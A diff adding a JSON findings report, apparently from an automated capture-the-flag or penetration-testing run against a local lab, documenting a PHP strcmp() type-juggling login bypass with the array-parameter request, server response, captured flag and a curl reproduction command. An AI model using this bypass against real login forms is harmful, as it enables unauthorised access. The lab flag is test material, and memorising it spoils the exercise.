@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:34:57.120913+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "0943478f-7c7e-42f4-b8d0-57e66d6c637e",
+      "timestamp": "2026-04-12T22:34:57.120800+00:00",
+      "title": "PHP strcmp() Type Juggling Authentication Bypass",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43431/index.php",
+      "description": "The login form at index.php uses PHP's strcmp() with loose comparison (==) to validate the password. By passing the password parameter as an array (password[]=anything), strcmp() receives an array instead of a string, causing it to return NULL. In PHP's loose comparison, NULL == 0 evaluates to true, completely bypassing authentication. The application then discloses the CTF flag.",
+      "evidence": "Request: GET /index.php?username=admin&password[]=anything\n\nResponse body contains:\nWarning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 71\nWelcome Admin\nCongratulations, here is the flag: flag{5a33e31a-7627-4044-964f-744917d6ca5f}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl 'http://172.17.0.1:43431/index.php?username=admin&password[]=anything'",
+        "expected": "Welcome Admin + flag{5a33e31a-7627-4044-964f-744917d6ca5f}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "61667c4e-08cf-497d-a068-bbba50e499d6",
+      "timestamp": "2026-04-12T22:35:05.447784+00:00",
+      "title": "AUTH 05 Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> LoginForm[\"Login Form GET /index.php\"]\n  LoginForm --> PHP[\"PHP 5.6.40 on Apache 2.4.25\"]\n  PHP --> Strcmp[\"strcmp() password check\"]\n  Strcmp -- \"NULL == 0 (type juggle)\" --> Bypass[\"Auth Bypass via array param\"]\n  Bypass --> Flag[\"Flag Disclosure\"]\n  PHP --> Static[\"Static Assets /static/\"]\n  PHP -- \"Normal failure\" --> Denied[\"Access Denied\"]"
+    }
+  ]
+}
